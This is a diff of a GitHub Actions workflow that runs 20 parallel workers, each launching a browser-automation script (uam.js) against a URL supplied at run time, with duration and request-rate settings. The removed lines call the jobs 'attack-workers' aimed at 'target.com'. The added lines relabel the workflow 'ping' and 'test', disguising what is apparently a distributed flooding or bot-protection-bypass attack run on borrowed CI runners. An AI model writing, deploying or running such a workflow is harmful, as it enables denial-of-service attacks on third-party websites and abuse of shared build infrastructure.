@@ -1,27 +1,33 @@
-name: Load Testing Suite
-on: workflow_dispatch
+name: ping
+on:
+  workflow_dispatch:
+    inputs:
+      url: {description: 'URL', required: true, default: 'https://example.com'}
+      time: {description: 'Time (s)', required: true, default: '60'}
+      rate: {description: 'Rate', required: true, default: '5'}
+      cookies: {description: 'Cookies', required: true, default: '3'}
 
 jobs:
-  attack-workers:
+  test:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    
     steps:
       - uses: actions/checkout@v4
       
-      - name: Install dependencies
-        run: |
+      - run: |
           sudo apt update
           sudo apt install -y xvfb nodejs npm
-          npm i puppeteer-real-browser
-          
-      - name: Start virtual display
-        run: |
           Xvfb :99 -screen 0 1920x1080x24 &
           export DISPLAY=:99
+          npm i puppeteer-real-browser
           
-      - name: Run attack worker ${{ matrix.worker }}
-        run: |
-          cd ${{ github.workspace }}
-          node uam.js "https://target.com" 60 5 2 3
+      - run: |
+          node uam.js \
+            "${{ github.event.inputs.url }}" \
+            ${{ github.event.inputs.time }} \
+            ${{ github.event.inputs.rate }} \
+            2 \
+            ${{ github.event.inputs.cookies }}
